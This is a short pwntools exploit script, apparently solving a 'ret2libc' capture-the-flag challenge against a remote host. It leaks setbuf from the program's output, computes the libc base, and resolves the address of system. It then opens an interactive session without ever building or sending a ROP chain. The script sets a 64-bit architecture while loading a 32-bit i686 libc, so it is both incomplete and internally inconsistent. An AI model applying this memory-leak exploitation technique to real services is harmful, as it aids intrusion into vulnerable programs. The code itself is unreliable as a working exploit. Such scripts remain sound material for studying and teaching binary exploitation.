from pwn import *

context.arch = 'amd64'
if args.REMOTE:
    p = remote('lmao.lol', 7002)
elif args.HOST:
    p = process('./ret2libc')
else:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '70']
    p = gdb.debug('./ret2libc',
                  gdbscript='''
                      b *main
                      c
                      ''')
libc = ELF('./glibc-2.28-251.el8.2.i686.so')
setbuf_offset = libc.symbols['setbuf']

output = p.recvuntil(b'- ')
address_part = p.recvuntil(b' -').strip().decode()
address_part = address_part.replace(' -', '')
setbuf_addr = int(address_part, 16)
libc_base = setbuf_addr - setbuf_offset


rop = ROP(libc)

# Calculate the system address
system_addr = libc.symbols['system'] + libc_base
assert system_addr is not None, "System address could not be calculated"
print('System Addr:', hex(system_addr))
print('setbuf Addr:', hex(setbuf_addr))

p.interactive()
